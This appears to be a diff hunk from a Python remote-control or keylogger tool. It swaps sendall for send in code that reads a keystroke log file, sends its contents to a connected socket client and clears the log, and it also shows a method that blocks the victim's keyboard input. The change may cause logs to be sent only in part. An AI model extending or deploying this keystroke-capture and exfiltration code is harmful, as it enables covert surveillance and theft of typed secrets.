@@ -59,13 +59,13 @@ class KeyboardController():
         f.close()
         if s=="": 
             ss = "No"
-            self.__client.sendall(ss.encode('utf-8'))
+            self.__client.send(ss.encode('utf-8'))
         else:
             ss = "Yes"
-            self.__client.sendall(ss.encode('utf-8'))
+            self.__client.send(ss.encode('utf-8'))
             check = self.__client.recv(10)
             open(KeyLog.FilLogPath, "w")
-            self.__client.sendall(s.encode('utf-8'))
+            self.__client.send(s.encode('utf-8'))
 
     def lockKeyboard(self):
         windll.user32.BlockInput(True)
